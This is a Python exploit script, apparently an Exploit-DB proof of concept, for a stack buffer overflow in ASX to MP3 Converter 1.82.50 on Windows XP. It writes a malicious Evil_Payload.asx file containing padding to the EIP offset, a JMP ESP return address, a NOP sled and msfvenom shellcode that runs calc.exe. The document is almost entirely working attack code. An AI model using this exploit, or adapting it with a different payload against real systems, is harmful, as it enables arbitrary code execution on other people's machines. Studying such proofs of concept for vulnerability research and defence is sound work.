#!/usr/bin/env python
#---------------------------------------------------------------------------------------------------------#
# Software      = ASX to MP3 Converter Version 1.82.50                                                    #
# Download Link = https://www.exploit-db.com/apps/b7c8c2a232e1d4a959c43970a877a799-ASXtoMP3Converter.exe  #
# Date          = 10/24/2017                                                                              #
# Reference     = https://www.exploit-db.com/exploits/38382/                                              #
# Author        = @ihack4falafel                                                                          #
# Tested on     = Windows XP SP3  - Professional                                                          #
# EIP Offset    = 233                                                                                     #
# Badchars      = "\x00\x09\x0a\x1a"                                                                      #
# RET Address   = 0x1003789d : "\xFF\xE4" | [MSA2Mutility03.dll]                                          #
# Usage         = ASX to MP3 Converter > load > Evil_Payload.asx                                          #        
#---------------------------------------------------------------------------------------------------------#

import struct
import time
import sys 

#----------------------------------------------------------------------------------#
# msfvenom -p windows/exec CMD=calc.exe -b "\x00\x09\x0a\x1a" -f python -v payload #
#----------------------------------------------------------------------------------#

payload =  ""
payload += "\xdb\xdb\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x31\xbd"
payload += "\xb0\x10\x19\xb2\x31\x6a\x18\x83\xea\xfc\x03\x6a"
payload += "\xa4\xf2\xec\x4e\x2c\x70\x0e\xaf\xac\x15\x86\x4a"
payload += "\x9d\x15\xfc\x1f\x8d\xa5\x76\x4d\x21\x4d\xda\x66"
payload += "\xb2\x23\xf3\x89\x73\x89\x25\xa7\x84\xa2\x16\xa6"
payload += "\x06\xb9\x4a\x08\x37\x72\x9f\x49\x70\x6f\x52\x1b"
payload += "\x29\xfb\xc1\x8c\x5e\xb1\xd9\x27\x2c\x57\x5a\xdb"
payload += "\xe4\x56\x4b\x4a\x7f\x01\x4b\x6c\xac\x39\xc2\x76"
payload += "\xb1\x04\x9c\x0d\x01\xf2\x1f\xc4\x58\xfb\x8c\x29"
payload += "\x55\x0e\xcc\x6e\x51\xf1\xbb\x86\xa2\x8c\xbb\x5c"
payload += "\xd9\x4a\x49\x47\x79\x18\xe9\xa3\x78\xcd\x6c\x27"
payload += "\x76\xba\xfb\x6f\x9a\x3d\x2f\x04\xa6\xb6\xce\xcb"
payload += "\x2f\x8c\xf4\xcf\x74\x56\x94\x56\xd0\x39\xa9\x89"
payload += "\xbb\xe6\x0f\xc1\x51\xf2\x3d\x88\x3f\x05\xb3\xb6"
payload += "\x0d\x05\xcb\xb8\x21\x6e\xfa\x33\xae\xe9\x03\x96"
payload += "\x8b\x06\x4e\xbb\xbd\x8e\x17\x29\xfc\xd2\xa7\x87"
payload += "\xc2\xea\x2b\x22\xba\x08\x33\x47\xbf\x55\xf3\xbb"
payload += "\xcd\xc6\x96\xbb\x62\xe6\xb2\xdf\xe5\x74\x5e\x0e"
payload += "\x80\xfc\xc5\x4e"

#----------------------------#
#      Buffer Structure      #
#----------------------------#
# buffer = AAA...........AAA #
# buffer = EIP - RET Address #
# buffer = NOPSled           #
# buffer = payload           #
# buffer = BBB...........BBB #
#----------------------------#

buffer  = "A" * 233
buffer += struct.pack('<L', 0x1003789d)
buffer += "\x90" * 40
buffer += payload
buffer += "B" * (1000-233-4-40-len(payload))

#-----------------------------------------------------#
# This code is for progress bar testing purposes only #
#-----------------------------------------------------#

print "Generating %s bytes evil file" %(len(buffer))
toolbar_width = 29
sys.stdout.write("[%s]" % (" " * toolbar_width))
sys.stdout.flush()
sys.stdout.write("\b" * (toolbar_width+1)) 

for i in xrange(toolbar_width):
    time.sleep(0.2) 
    sys.stdout.write("-")
    sys.stdout.flush()

sys.stdout.write("\n")
print "Done!"

f=open("Evil_Payload.asx","w")
time.sleep(2)

try:   
  f.write(buffer)
  f.close()
  print "File created"
except:
  print "File cannot be created"
